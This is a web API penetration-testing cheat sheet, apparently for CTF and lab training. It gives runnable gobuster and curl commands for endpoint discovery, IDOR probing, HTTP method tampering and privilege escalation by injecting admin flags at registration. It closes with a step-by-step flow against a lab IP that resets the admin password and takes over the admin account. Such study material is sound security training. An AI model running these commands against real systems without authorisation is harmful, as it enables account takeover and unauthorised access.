# Web API Exploitation Guide - Quick Reference

## API Discovery & Enumeration

### Pattern-Based API Discovery
Create pattern file for version enumeration:
```bash
# Create pattern file
echo -e "{GOBUSTER}/v1\n{GOBUSTER}/v2" > api_pattern.txt

# Run with pattern
gobuster dir -u http://TARGET:PORT \
  -w /usr/share/wordlists/dirb/big.txt \
  -p api_pattern.txt
```

### Recommended Wordlists
- **Quick scan**: `/usr/share/wordlists/dirb/small.txt`
- **Standard**: `/usr/share/wordlists/dirb/big.txt`
- **Comprehensive**: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- **API-specific**: `/usr/share/seclists/Discovery/API/api-endpoints.txt`

## REST API Testing Workflow

### 1. Initial Enumeration
```bash
# Port scan for API services
nmap -p5000-5010 TARGET -sV

# Basic directory enumeration
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt

# API version discovery
gobuster dir -u http://TARGET:PORT \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -p api_pattern.txt -t 30
```

### 2. Endpoint Investigation
```bash
# GET request - enumerate users
curl -i http://TARGET:PORT/users/v1

# GET request - enumerate resources
curl -i http://TARGET:PORT/books/v1

# Discover sub-endpoints
gobuster dir -u http://TARGET:PORT/users/v1/admin/ \
  -w /usr/share/wordlists/dirb/small.txt
```

### 3. Authentication Testing
```bash
# Test login with wrong credentials (identify parameters)
curl -d '{"password":"test","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://TARGET:PORT/users/v1/login

# Register new user (test for privilege escalation)
curl -d '{"username":"hacker","password":"pass","email":"test@test.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://TARGET:PORT/users/v1/register

# Login with created user
curl -d '{"username":"hacker","password":"pass"}' \
  -H 'Content-Type: application/json' \
  http://TARGET:PORT/users/v1/login
```

### 4. Method Tampering
When receiving `405 Method Not Allowed`:
```bash
# Try PUT instead of POST
curl -X 'PUT' http://TARGET:PORT/endpoint \
  -H 'Content-Type: application/json' \
  -d '{"key":"value"}'

# Try DELETE
curl -X 'DELETE' http://TARGET:PORT/endpoint

# Try PATCH
curl -X 'PATCH' http://TARGET:PORT/endpoint \
  -H 'Content-Type: application/json' \
  -d '{"key":"value"}'
```

### 5. Authenticated Requests
```bash
# Use JWT token for privileged operations
curl -X 'PUT' http://TARGET:PORT/users/v1/admin/password \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth JWT_TOKEN_HERE' \
  -d '{"password":"newpassword"}'

# Bearer token alternative
curl -H 'Authorization: Bearer JWT_TOKEN_HERE' \
  http://TARGET:PORT/api/admin/users
```

## Common API Vulnerabilities

### 1. Privilege Escalation via Registration
```bash
# Test parameters during registration
curl -d '{"username":"test","password":"pass","email":"test@test.com",
  "admin":"True",
  "role":"admin",
  "isAdmin":true,
  "permissions":["admin"],
  "user_level":99}' \
  -H 'Content-Type: application/json' \
  http://TARGET:PORT/users/v1/register
```

### 2. IDOR (Insecure Direct Object Reference)
```bash
# Test accessing other users' data
curl http://TARGET:PORT/api/users/1
curl http://TARGET:PORT/api/users/2
curl http://TARGET:PORT/api/orders/100
```

### 3. Method Override
```bash
# Test X-HTTP-Method-Override header
curl -X POST http://TARGET:PORT/endpoint \
  -H 'X-HTTP-Method-Override: PUT' \
  -d '{"data":"value"}'
```

## Response Code Analysis

| Code | Meaning | Action |
|------|---------|--------|
| 200 | Success | Parse response data |
| 401 | Unauthorized | Need authentication |
| 403 | Forbidden | Need higher privileges |
| 404 | Not Found | Check if real 404 or custom message |
| 405 | Method Not Allowed | **Endpoint exists!** Try other methods |
| 500 | Server Error | Possible injection point |

## Burp Suite Integration

```bash
# Route curl through Burp
curl --proxy 127.0.0.1:8080 http://TARGET:PORT/api/endpoint

# With HTTPS (ignore cert errors)
curl --proxy 127.0.0.1:8080 -k https://TARGET:PORT/api/endpoint
```

## Quick Exploitation Checklist

- [ ] Port scan (5000-5010 common for dev APIs)
- [ ] Enumerate base endpoints (/ui, /console, /docs, /swagger)
- [ ] Discover API versions with patterns
- [ ] List all users/resources
- [ ] Test registration for privilege escalation
- [ ] Try all HTTP methods on discovered endpoints
- [ ] Test for IDOR vulnerabilities
- [ ] Check for JWT token weaknesses
- [ ] Test input validation (SQLi, XXE, etc.)
- [ ] Look for information disclosure in errors

## Common API Paths

```
/api/v1/
/api/v2/
/v1/
/v2/
/users/v1
/books/v1
/products/v1
/orders/v1
/admin/v1
/api/users
/api/login
/api/register
/api/logout
/api/admin
/api/docs
/swagger
/ui
/console
/graphql
/api-docs
```

## Practical Example - Full Attack Flow

```bash
# 1. Discover APIs
gobuster dir -u http://192.168.229.16:5002 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -p api_pattern.txt

# 2. Enumerate users
curl http://192.168.229.16:5002/users/v1

# 3. Register admin user
curl -d '{"username":"pwn","password":"pwn","email":"pwn@test.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.229.16:5002/users/v1/register

# 4. Login and get token
curl -d '{"username":"pwn","password":"pwn"}' \
  -H 'Content-Type: application/json' \
  http://192.168.229.16:5002/users/v1/login

# 5. Change admin password
curl -X 'PUT' \
  'http://192.168.229.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth TOKEN_HERE' \
  -d '{"password":"hacked"}'

# 6. Login as admin
curl -d '{"username":"admin","password":"hacked"}' \
  -H 'Content-Type: application/json' \
  http://192.168.229.16:5002/users/v1/login
```

## Key Takeaways

1. **405 = Endpoint exists** - Try different HTTP methods
2. **Check error messages** - "User not found" vs real 404
3. **Test registration** - Often vulnerable to privilege escalation
4. **Try PUT for updates** - When POST fails for password changes
5. **Always test /ui, /docs, /swagger** - May contain full API documentation
6. **Use patterns** - Efficiently discover versioned APIs
7. **JWT tokens** - Save and reuse for authenticated requests

## Flag Locations (CTF/Labs)
- Check HTML comments
- API response headers
- Error messages
- Admin-only endpoints after privilege escalation
- Hidden API documentation